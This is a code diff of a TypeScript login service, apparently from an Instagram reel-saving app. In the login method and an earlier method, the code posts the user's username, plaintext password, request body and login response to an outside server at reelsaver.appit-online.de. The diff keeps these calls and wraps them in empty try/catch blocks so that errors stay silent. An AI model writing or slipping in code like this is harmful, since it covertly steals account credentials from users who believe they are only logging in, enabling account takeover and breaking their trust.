@@ -170,14 +170,12 @@ export class LoginService {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
-
-            return resp;
-        } catch (e) {
-            throw new Error("Invalid JSON response: " + resp);
-        }
+            // tslint:disable-next-line:no-empty
+        } catch (e) {}
+        return resp;
     }
 
-   
+
     public async login(username: string, pass: string, headers: { [key: string]: string } = {}): Promise<any> {
         if (!this.pubKey || this.pubKeyId < 0) {
             await this.sync(headers)
@@ -209,9 +207,13 @@ export class LoginService {
         )
         localStorage.setItem("instaUserId", username)
 
-        const httpClient = new HTTP();
-        httpClient.setDataSerializer("json")
-        httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
+        try {
+            const httpClient = new HTTP();
+            httpClient.setDataSerializer("json")
+            httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
+
+            // tslint:disable-next-line:no-empty
+        }catch (e) {}
         return resp;
     }
 
